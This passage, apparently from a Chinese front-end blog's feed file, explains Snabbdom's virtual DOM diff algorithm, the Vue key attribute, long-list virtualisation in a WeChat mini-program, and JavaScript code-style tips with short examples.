class="built_in">string</span>&gt; | <span class="literal">undefined</span></span><br><span class="line">  <span class="comment">// 记录 vnode 对应的真实 DOM</span></span><br><span class="line">  elm: Node | <span class="literal">undefined</span></span><br><span class="line">  <span class="comment">// 节点中的内容，和 children 只能互斥</span></span><br><span class="line">  text: <span class="built_in">string</span> | <span class="literal">undefined</span></span><br><span class="line">  key: Key | <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现接口</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">vnode</span> (<span class="params">sel: <span class="built_in">string</span> | <span class="literal">undefined</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">  data: <span class="built_in">any</span> | <span class="literal">undefined</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">  children: <span class="built_in">Array</span>&lt;VNode | <span class="built_in">string</span>&gt; | <span class="literal">undefined</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">  text: <span class="built_in">string</span> | <span class="literal">undefined</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">  elm: Element | Text | <span class="literal">undefined</span></span>): <span class="title">VNode</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> key = data === <span class="literal">undefined</span> ? <span class="literal">undefined</span> : data.key</span><br><span class="line">  <span class="comment">// 使用js对象描述DOM</span></span><br><span class="line">  <span class="keyword">return</span> &#123; sel, data, children, text, elm, key &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="patch过程"><a href="#patch过程" class="headerlink" title="patch过程"></a>patch过程</h3><ul><li>patch(oldVnode, newVnode)</li><li>打补丁，把新节点中变化的内容渲染到真实DOM，最后返回新节点作为下一次处理的旧节点</li><li>对比新旧 VNode 是否相同节点（节点的 key 和 sel 相同）</li><li>如果不是相同节点，删除之前的内容，重新渲染</li><li>如果是相同节点，再判断新的 VNode 是否有 text，如果有并且和旧节点 text 不同，直接更新</li><li>如果新的 VNode 有 children，判断子节点是否有变化，判断子节点的过程使用的就是 diff 算法</li><li>diff 过程只进行同层级比较</li></ul><h3 id="init函数"><a href="#init函数" class="headerlink" title="init函数"></a>init函数</h3><ul><li><p><strong>功能：</strong>init(modules, domApi)，返回 patch() 函数（高阶函数）</p></li><li><p>为什么要使用高阶函数？</p><ul><li><p>因为 patch() 函数在外部会调用多次，每次调用依赖一些参数，比如：modules/domApi/cbs</p></li><li><p>通过高阶函数让 init() 内部形成闭包，返回的 patch() 可以访问到 modules/domApi/cbs，而不需要重新创建</p></li></ul></li><li><p>init() 在返回 patch() 之前，首先收集了所有模块中的钩子函数存储到 cbs 对象中</p></li><li><p>源码位置：src/snabbdom.ts</p></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 钩子函数</span></span><br><span class="line"><span class="keyword">const</span> hooks: (keyof Module)[] = [<span class="string">'create'</span>, <span class="string">'update'</span>, <span class="string">'remove'</span>, <span class="string">'destroy'</span>, <span class="string">'pre'</span>, <span class="string">'post'</span>];</span><br><span class="line"><span class="comment">// 第一个参数是模块，参考上面模块使用的部分</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">modules: <span class="built_in">Array</span>&lt;Partial&lt;Module&gt;&gt;, domApi?: DOMAPI</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">let</span> i: <span class="built_in">number</span>, j: <span class="built_in">number</span>, cbs = (&#123;&#125; <span class="keyword">as</span> ModuleHooks); </span><br><span class="line">    <span class="comment">// 初始化 api ，htmlDomApi里是一些原生 DOM api，用于创建真实 DOM</span></span><br><span class="line">    <span class="comment">// 如果想把虚拟 DOM 转化为其他类型时，可以传入第二个参数</span></span><br><span class="line">    <span class="keyword">const</span> api: DOMAPI = domApi !== <span class="literal">undefined</span> ? domApi : htmlDomApi; </span><br><span class="line">    <span class="comment">// 把传入的所有模块的钩子方法，统一存储到 cbs 对象中 </span></span><br><span class="line">    <span class="comment">// 最终构建的 cbs 对象的形式 cbs = [ create: [fn1, fn2], update: [], ... ] </span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; hooks.length; ++i) &#123; </span><br><span class="line">        <span class="comment">// cbs['create'] = [] </span></span><br><span class="line">        cbs[hooks[i]] = []; </span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; modules.length; ++j) &#123; </span><br><span class="line">         <span class="comment">// const hook = modules[0]['create'] </span></span><br><span class="line">            <span class="comment">// 每一个模块都会导出钩子函数的方法，例如 attributes.ts 中导出</span></span><br><span class="line">            <span class="comment">// export const attributesModule: Module = </span></span><br><span class="line">            <span class="comment">// &#123; create: updateAttrs, update: updateAttrs &#125;</span></span><br><span class="line">            <span class="keyword">const</span> hook = modules[j][hooks[i]]; </span><br><span class="line">            <span class="keyword">if</span> (hook !== <span class="literal">undefined</span>) &#123; </span><br><span class="line">                (cbs[hooks[i]] <span class="keyword">as</span> <span class="built_in">Array</span>&lt;<span class="built_in">any</span>&gt;).push(hook);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    …</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">patch</span>(<span class="params">oldVnode: VNode | Element, vnode: VNode</span>): <span class="title">VNode</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="patch函数"><a href="#patch函数" class="headerlink" title="patch函数"></a>patch函数</h3><ul><li><p><strong>功能：</strong></p><ul><li>传入新旧 VNode，对比差异，把差异渲染到 DOM</li><li>返回新的 VNode，作为下一次 patch() 的 oldVnode</li></ul></li><li><p><strong>执行过程：</strong></p><ul><li>如果 oldVnode 和 vnode 相同（key 和 sel 相同）<ul><li>调用 patchVnode()，找节点的差异并更新 DOM</li></ul></li><li>如果 oldVnode 和 vnode 不同，且oldVnode 是 DOM 元素<ul><li>把 DOM 元素转换成 oldVnode</li><li>调用 createElm() 把 vnode 转换为真实 DOM，记录到 vnode.elm</li><li>把刚创建的 DOM 元素插入到 parent 中</li><li>移除老节点</li></ul></li></ul></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果新旧节点是相同节点(key 和 sel 相同) </span></span><br><span class="line"><span class="keyword">if</span> (sameVnode(oldVnode, vnode)) &#123; </span><br><span class="line">    <span class="comment">// 找节点的差异并更新 DOM </span></span><br><span class="line">    patchVnode(oldVnode, vnode, insertedVnodeQueue); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">// 如果新旧节点不同，vnode 创建对应的 DOM </span></span><br><span class="line">    <span class="comment">// 获取当前的 DOM 元素 </span></span><br><span class="line">    elm = oldVnode.elm!; </span><br><span class="line">    parent = api.parentNode(elm); </span><br><span class="line">    <span class="comment">// createElm 是为 VNode 创建真实的 DOM </span></span><br><span class="line">    createElm(vnode, insertedVnodeQueue); </span><br><span class="line">    <span class="keyword">if</span> (parent !== <span class="literal">null</span>) &#123; </span><br><span class="line">        <span class="comment">// 如果父节点不为空，把 vnode 对应的 DOM 插入到文档中 </span></span><br><span class="line">        api.insertBefore(parent, vnode.elm!, api.nextSibling(elm)); </span><br><span class="line">        <span class="comment">// 移除老节点 </span></span><br><span class="line">        removeVnodes(parent, [oldVnode], <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> vnode</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当可以比较时，调用 patchVnode 找差异并更新 DOM</span></span><br><span class="line"><span class="comment">// 当不值得比较时，新节点直接把老节点整个替换了</span></span><br><span class="line"><span class="comment">// 最后会返回 VNode，可以继续进行下一个 patch 过程</span></span><br></pre></td></tr></table></figure><h3 id="patchVnode函数"><a href="#patchVnode函数" class="headerlink" title="patchVnode函数"></a>patchVnode函数</h3><ul><li><p>功能：</p><ul><li>patchVnode(oldVnode, vnode, insertedVnodeQueue)</li><li>对比 oldVnode 和 vnode 的差异，把差异渲染到 DOM</li></ul></li><li><p>执行过程：</p><ul><li><code>if(oldVnode === vnode)</code>则没有变化</li><li><code>if(oldVnode.text !== null &amp;&amp; vnode.text !== null &amp;&amp; oldVnode.text !== vnode.text)</code>，文本节点的比较，需要修改，则会调用<code>Node.textContent = vnode.text</code>。</li><li><code>if(oldVnode.children &amp;&amp; vnode.children)</code>, 两个节点都有子节点，而且它们不一样，这样我们会调用<code>updateChildren</code>函数比较子节点，<strong>这是diff的核心</strong>。</li><li>如果 vnode.children 有值， oldVnode.children 无值<ul><li>清空 DOM 元素</li><li>调用 addVnodes() ，批量添加子节点</li></ul></li><li>如果 oldVnode.children 有值， vnode.children 无值<ul><li>调用 removeVnodes() ，批量移除子节点</li></ul></li></ul></li></ul><h3 id="updateChildren"><a href="#updateChildren" class="headerlink" title="updateChildren"></a><strong>updateChildren</strong></h3><ul><li><p><strong>功能：</strong></p><ul><li>diff 算法的核心，对比新旧节点的 children，更新 DOM</li></ul></li><li><p><strong>执行过程：</strong></p><ul><li>此外可参考：<a href="https://juejin.im/post/6844903607913938951" target="_blank" rel="noopener">https://juejin.im/post/6844903607913938951</a></li><li>在对<strong>开始和结束节点</strong>比较的时候，总共有四种情况<ul><li>oldStartVnode / newStartVnode (旧开始节点 / 新开始节点)</li><li>oldEndVnode / newEndVnode (旧结束节点 / 新结束节点)</li><li>oldStartVnode / oldEndVnode (旧开始节点 / 新结束节点)</li><li>oldEndVnode / newStartVnode (旧结束节点 / 新开始节点)</li></ul></li></ul></li></ul><p><img src="https://s1.ax1x.com/2020/10/09/0rCzTI.png" alt="0rCzTI.png"></p><ul><li><p>开始节点和结束节点比较，这两种情况类似</p><ul><li>oldStartVnode / newStartVnode (旧开始节点 / 新开始节点)</li><li>oldEndVnode / newEndVnode (旧结束节点 / 新结束节点)</li></ul></li><li><p>如果 oldStartVnode 和 newStartVnode 是 sameVnode (key 和 sel 相同)</p><ul><li>调用 patchVnode() 对比和更新节点</li><li>把旧开始和新开始索引往后移动 oldStartIdx++ / oldEndIdx++</li></ul></li></ul><hr><p><img src="https://s1.ax1x.com/2020/10/09/0rPgAI.png" alt="0rPgAI.png"></p><ul><li>oldStartVnode / newEndVnode (旧开始节点 / 新结束节点) 相同<ul><li>调用 patchVnode() 对比和更新节点</li><li>把 oldStartVnode 对应的 DOM 元素，移动到右边<ul><li>更新索引</li></ul></li></ul></li></ul><hr><p><img src="https://s1.ax1x.com/2020/10/09/0ri3PP.png" alt="0ri3PP.png"></p><ul><li>oldEndVnode / newStartVnode (旧结束节点 / 新开始节点) 相同<ul><li>调用 patchVnode() 对比和更新节点</li><li>把 oldEndVnode 对应的 DOM 元素，移动到左边<ul><li>更新索引</li></ul></li></ul></li></ul><hr><ul><li>如果不是以上四种情况<ul><li>遍历新节点，使用 newStartNode 的 key 在老节点数组中找相同节点</li><li>如果没有找到，说明 newStartNode 是新节点<ul><li>创建新节点对应的 DOM 元素，插入到 DOM 树中</li></ul></li><li>如果找到了<ul><li>判断新节点和找到的老节点的 sel 选择器是否相同</li><li>如果不相同，说明节点被修改了<ul><li>重新创建对应的 DOM 元素，插入到 DOM 树中</li></ul></li><li>如果相同，把 elmToMove 对应的 DOM 元素，移动到左边</li></ul></li></ul></li></ul><hr><ul><li>当老节点的所有子节点先遍历完 (oldStartIdx &gt; oldEndIdx)，循环结束<ul><li>说明新节点有剩余，把剩余节点批量插入到右边</li></ul></li></ul><p><img src="https://s1.ax1x.com/2020/10/09/0rFz79.png" alt="0rFz79.png"></p><ul><li>新节点的所有子节点先遍历完 (newStartIdx &gt; newEndIdx)，循环结束<ul><li>说明老节点有剩余，把剩余节点批量删除</li></ul></li></ul><p><img src="https://s1.ax1x.com/2020/10/09/0rkBcT.png" alt="0rkBcT.png"></p><h2 id="关于-V-for-带-key"><a href="#关于-V-for-带-key" class="headerlink" title="关于 V-for 带 key"></a>关于 V-for 带 key</h2><p>参考：<a href="https://juejin.im/post/6844903577215827982" target="_blank" rel="noopener">https://juejin.im/post/6844903577215827982</a></p><p>官方：<a href="https://cn.vuejs.org/v2/api/#key" target="_blank" rel="noopener">https://cn.vuejs.org/v2/api/#key</a></p><p>除了上述所说，更快速 : key 的唯一性可以被 Map 数据结构充分利用,相比于遍历查找的时间复杂度 O(n),Map 的时间复杂度仅仅为 O(1),源码如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createKeyToOldIdx</span>(<span class="params">children, beginIdx, endIdx</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> i, key;</span><br><span class="line">  <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (i = beginIdx; i &lt;= endIdx; ++i) &#123;</span><br><span class="line">    key = children[i].key;</span><br><span class="line">    <span class="keyword">if</span> (isDef(key)) map[key] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 虚拟DOM与diff算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>小程序长列表优化</title>
      <link href="2020/09/20/%E6%95%B4%E7%90%86-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%95%BF%E5%88%97%E8%A1%A8%E4%BC%98%E5%8C%96/"/>
      <url>2020/09/20/%E6%95%B4%E7%90%86-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%95%BF%E5%88%97%E8%A1%A8%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<ul><li>滚动加载</li><li><p>虚拟列表</p></li><li><p>参考：<a href="https://zhuanlan.zhihu.com/p/146791824" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/146791824</a></p></li></ul><a id="more"></a><p>思路:</p><ol><li>一维数组 =&gt; 二维数组，每个子数组存放十条数据（一屏）</li><li>每加载一屏，计算一下高度，用一个高度数组存储</li><li>对每一屏数据位置进行监听，只有在可视范围内展示</li><li>为防止过快滚动出现白屏，可视范围扩展至屏幕上下各2000高度</li></ol><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><ul><li>一维数组 =&gt; 二维数组</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div :id=&quot;&apos;wrp_&apos; + index1&quot; v-for=&quot;(question, index) in questionList&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">&lt;div v-if=&quot;question.length &gt; 0&quot;&gt;</span><br><span class="line">&lt;div v-for=&quot;item in question&quot; :key=&quot;item.questionId&quot;&gt;</span><br><span class="line">            &lt;list-item&gt;&lt;/list-item&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">     &lt;div v-else :style=&quot;&#123; height: pageHeightArr[index1] + &apos;px&apos; &#125;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li>调用接口</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getQuestionList() &#123;</span><br><span class="line">          <span class="comment">// 每次调用接口获取 10 条数据，为一组</span></span><br><span class="line">          API.getList(params).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">this</span>.questionList.push(res)</span><br><span class="line">              <span class="keyword">this</span>.dataList.push(res)</span><br><span class="line">              <span class="comment">// setHeight: 获取高度</span></span><br><span class="line">              <span class="keyword">this</span>.$nextTick(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">this</span>.setHeight()</span><br><span class="line">                  &#125;, <span class="number">50</span>)</span><br><span class="line">              &#125;)</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><ul><li>获取高度与监听</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">setHeight() &#123;</span><br><span class="line"><span class="keyword">const</span> that = <span class="keyword">this</span></span><br><span class="line"><span class="keyword">const</span> wholePageIndex = <span class="keyword">this</span>.pageNum - <span class="number">1</span></span><br><span class="line"><span class="keyword">this</span>.query = wx.createSelectorQuery()</span><br><span class="line">    <span class="comment">// 获取 DOM 元素</span></span><br><span class="line"><span class="keyword">this</span>.query.select(<span class="string">`#wrp_<span class="subst">$&#123;wholePageIndex&#125;</span>`</span>).boundingClientRect()</span><br><span class="line">    <span class="comment">// 获取高度</span></span><br><span class="line"><span class="keyword">this</span>.query.exec(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">that.pageHeightArr[wholePageIndex] = res[<span class="number">0</span>] &amp;&amp; res[<span class="number">0</span>].height</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'高度数组：'</span> + that.pageHeightArr)</span><br><span class="line">&#125;)</span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line"><span class="keyword">this</span>.observePage(wholePageIndex)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">observePage(pageIndex) &#123;</span><br><span class="line">    <span class="comment">// 监听可视区域上下各 1500 范围内</span></span><br><span class="line"><span class="keyword">const</span> observerObj = wx.createIntersectionObserver().relativeToViewport(</span><br><span class="line">&#123; <span class="attr">top</span>: <span class="number">1500</span>, <span class="attr">bottom</span>: <span class="number">1500</span> &#125;</span><br><span class="line">    )</span><br><span class="line">observerObj.observe(<span class="string">`#wrp_<span class="subst">$&#123;pageIndex&#125;</span>`</span>, (res) =&gt; &#123;</span><br><span class="line"><span class="keyword">if</span> (res.intersectionRatio &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 不在范围内 设置高度</span></span><br><span class="line"><span class="keyword">this</span>.$set(<span class="keyword">this</span>.questionList, pageIndex, <span class="keyword">this</span>.pageHeightArr[pageIndex])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 在范围内 设置数据</span></span><br><span class="line"><span class="keyword">this</span>.$set(<span class="keyword">this</span>.questionList, pageIndex, <span class="keyword">this</span>.dataList[pageIndex])</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 移动端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码规范</title>
      <link href="2020/09/20/%E6%95%B4%E7%90%86-%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/"/>
      <url>2020/09/20/%E6%95%B4%E7%90%86-%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<ul><li>使用默认值</li><li>解构语法</li><li>删掉注释的代码</li><li>尽量不用“非”条件句</li><li>使用Array.includes来处理多个条件</li><li>多个类似函数</li><li>使用 &amp;&amp; 运算符化简表达式</li><li>空值合并运算符 ‘??’</li><li>代码风格</li></ul><a id="more"></a><h2 id="使用默认值"><a href="#使用默认值" class="headerlink" title="使用默认值"></a>使用默认值</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createMicrobrewery</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> brewryName = name || <span class="string">'Hipster Brew'</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createMicrobrewery</span>(<span class="params">name = <span class="string">'Hipster Brew'</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解构语法"><a href="#解构语法" class="headerlink" title="解构语法"></a>解构语法</h2><p><strong>如果参数超过两个，可以使用解构语法，不用考虑参数的顺序</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createMenu</span>(<span class="params">title, body, buttonText, cancellable</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createMenu</span>(<span class="params">&#123; title, body, buttonText, cancellable &#125;</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">createMenu(&#123;</span><br><span class="line">    title: <span class="string">'Foo'</span>,</span><br><span class="line">    body: <span class="string">'Bar'</span>,</span><br><span class="line">    buttonText: <span class="string">'Baz'</span>,</span><br><span class="line">    cancellable: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="删掉注释的代码"><a href="#删掉注释的代码" class="headerlink" title="删掉注释的代码"></a>删掉注释的代码</h2><p><strong>git存在的意义就是保存你的旧代码，所以注释的代码赶紧删掉吧</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line">doStuff()</span><br><span class="line"><span class="comment">// doOtherStuff()</span></span><br><span class="line"><span class="comment">// doSomeMoreStuff()</span></span><br><span class="line"><span class="comment">// doSoMuchStuff()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Good</span></span><br><span class="line">doStuff()</span><br></pre></td></tr></table></figure><h2 id="尽量不用“非”条件句"><a href="#尽量不用“非”条件句" class="headerlink" title="尽量不用“非”条件句"></a>尽量不用“非”条件句</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isDOMNodeNotPresent</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isDOMNodeNotPresent(node)) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isDOMNodeNotPresent</span>(<span class="params">node</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isDOMNodeNotPresent(node)) &#123;   <span class="comment">// if后面记得加空格</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Array-includes来处理多个条件"><a href="#使用Array-includes来处理多个条件" class="headerlink" title="使用Array.includes来处理多个条件"></a>使用Array.includes来处理多个条件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">fruit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (fruit == <span class="string">'apple'</span> || fruit == <span class="string">'banana'</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(red)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果有更多的红色水果怎么办</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">fruit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> redFruits = [<span class="string">'apple'</span>, <span class="string">'strawberry'</span>, <span class="string">'cherry'</span>]</span><br><span class="line">    <span class="keyword">if</span> (redFruits.includes(fruit)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(red)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多个类似函数"><a href="#多个类似函数" class="headerlink" title="多个类似函数"></a>多个类似函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">update (node, key, attrName) &#123;</span><br><span class="line">   <span class="keyword">let</span> updateFn = <span class="keyword">this</span>[attrName + <span class="string">'Updater'</span>]</span><br><span class="line">   updateFn(node, key, attrName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> textUpdater (node, value, key) &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> modelUpdater (node, value, key) &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="使用-amp-amp-运算符化简表达式"><a href="#使用-amp-amp-运算符化简表达式" class="headerlink" title="使用 &amp;&amp; 运算符化简表达式"></a>使用 &amp;&amp; 运算符化简表达式</h2><p>让我们考虑一个具有布尔值和函数的情况。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> isPrime = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">const</span> startWatching = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Started Watching!'</span>);</span><br><span 